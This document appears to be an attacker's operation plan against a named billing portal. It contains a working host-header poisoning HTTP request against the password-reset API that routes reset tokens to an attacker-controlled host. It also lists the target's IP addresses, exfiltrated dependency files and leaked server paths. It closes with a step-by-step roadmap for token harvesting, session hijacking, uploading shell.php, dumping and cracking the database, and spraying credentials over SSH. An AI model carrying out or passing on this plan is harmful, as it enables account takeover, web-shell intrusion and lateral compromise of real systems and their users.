# OPERATION: BLACK MIRROR (seodomains.com.hr)
**Status:** GOD MODE / LETHAL
**Operator:** ASTRO
**Date:** Feb 15, 2026

## 1. PRIMARY KILL CHAIN: HOST HEADER POISONING
**Vulnerability:** Critical Unauthenticated API Abuse
**Endpoint:** `POST /api/guest/client/reset_password`
**Payload:**
```http
POST /api/guest/client/reset_password HTTP/1.1
Host: windstorm.getfoxyproxy.org
Content-Type: application/json

{"email":"admin@seodomains.com.hr"}
```
**Mechanism:** 
The backend constructs the password reset link using the poisoned `Host` header. The email containing the token is sent to the victim, but the link points to OUR C2 (`windstorm`). When clicked, the token is captured in our logs.
**Impact:** Total Account Takeover (ATO) of Admin/Staff credentials.

## 2. INFRASTRUCTURE MAPPING (THE "EDIS" CLUSTER)
The target is NOT isolated. It is physically co-located with active Graphite C2 nodes.
- **PORTAL (Target):** `46.183.184.105` (seodomains.com.hr)
- **C2 COMMANDER:** `46.183.184.147` (Confirmed Graphite JARM: `1dd...6eb`)
- **BOUNCER/PROXY:** `46.183.184.82` (Shadowsocks/Pharos JARM: `2ad...4e8`)
- **Analysis:** Compromising the portal likely yields credentials (password reuse) valid for the C2 nodes via SSH/RDP.

## 3. INTEL EXFILTRATION
- **Dependency Map:** `vendor/composer/installed.json` (Exfiltrated). 
  - **Libs:** dompdf v2.0.4, twig v3.8.0 (Patched, but reveals tech stack).
- **System Path:** `/var/www/billing/modules/Client/Api/Guest.php` (Leaked via JSON Type Error).
- **CMS Version:** FOSSBilling 0.6.14.

## 4. EXECUTION ROADMAP (GOD MODE)
1. **Token Harvesting:** Launch persistent Host Header attack on `admin@`, `support@`, `billing@`.
2. **Sinkhole Monitoring:** Watch `windstorm` logs for incoming token clicks.
3. **Session Hijacking:** Use token to reset password, login, and upload `shell.php` via "Theme Manager" or "File Manager".
4. **Lateral Pivot:** Dump database -> Crack hashes -> Spray credentials against `46.183.184.147` (SSH/4443).

**MISSION STATUS: READY FOR TAKEOVER.**
